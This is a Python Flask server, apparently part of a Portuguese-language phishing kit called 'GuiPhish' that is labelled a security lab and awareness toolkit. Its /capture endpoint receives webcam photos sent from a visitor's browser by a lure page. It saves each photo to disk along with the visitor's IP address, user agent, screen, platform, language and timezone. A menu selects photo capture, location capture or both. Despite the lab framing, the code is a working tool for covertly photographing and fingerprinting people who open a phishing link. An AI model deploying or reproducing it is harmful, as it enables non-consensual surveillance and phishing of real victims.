import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

BANNER = r"""
  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
 ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

        🔐 GuiPhish - Security Lab
        🎣 Phishing Awareness Toolkit
        🐧 Running on Kali Linux
"""

def menu():
    print("\n[+] Escolha o modo do lab:\n")
    print("1) 📸 Captura de Foto")
    print("2) 🌍 Captura de Localização")
    print("3) 🔄 Ambos / Completo")

    escolha = input("\nDigite a opção: ")

    if escolha == "1":
        return "foto"
    elif escolha == "2":
        return "localizacao"
    elif escolha == "3":
        return "completo"
    else:
        print("\n[!] Opção inválida. Iniciando em modo completo.\n")
        return "completo"


app = Flask(__name__)
CORS(app)

if not os.path.exists('fotos'):
    os.makedirs('fotos')


@app.route('/')
def index():
    return send_file('index.html')


@app.route('/capture', methods=['POST'])
def capture():
    try:
        if app.config.get("MODO") not in ["foto", "completo"]:
            return jsonify({
                'status': 'bloqueado',
                'mensagem': 'Modo captura de foto não está ativo'
            }), 403

        data = request.json

        if data and 'image' in data:
            img_data = data['image'].split(',')[1]
            img_bytes = base64.b64decode(img_data)

            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
            filename = f"fotos/{timestamp}.jpg"

            with open(filename, 'wb') as f:
                f.write(img_bytes)

            info = {
                'ip': request.remote_addr,
                'user_agent': data.get('userAgent', 'N/A'),
                'screen': data.get('screen', 'N/A'),
                'platform': data.get('platform', 'N/A'),
                'language': data.get('language', 'N/A'),
                'timezone': data.get('timezone', 'N/A'),
                'timestamp': data.get('timestamp', 'N/A')
            }

            with open(f"fotos/{timestamp}_info.json", 'w') as f:
                json.dump(info, f, indent=2)

            print(f"\n[+] FOTO RECEBIDA! IP: {request.remote_addr}")
            print(f"[+] Arquivo salvo: {filename}")

            return jsonify({'status': 'ok'}), 200

        return jsonify({'status': 'erro', 'mensagem': 'Sem imagem'}), 400

    except Exception as e:
        print(f"[-] Erro: {e}")
        return jsonify({'status': 'erro'}), 500


@app.route('/fotos', methods=['GET'])
def listar_fotos():
    return "Acesso bloqueado. As imagens ficam disponíveis apenas localmente no Kali.", 403


@app.route('/foto/<nome>')
def servir_foto(nome):
    return "Acesso bloqueado. As imagens ficam disponíveis apenas localmente no Kali.", 403


if __name__ == '__main__':
    print(BANNER)

    modo = menu()
    app.config["MODO"] = modo

    print(f"\n[+] Modo selecionado: {modo.upper()}\n")

    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
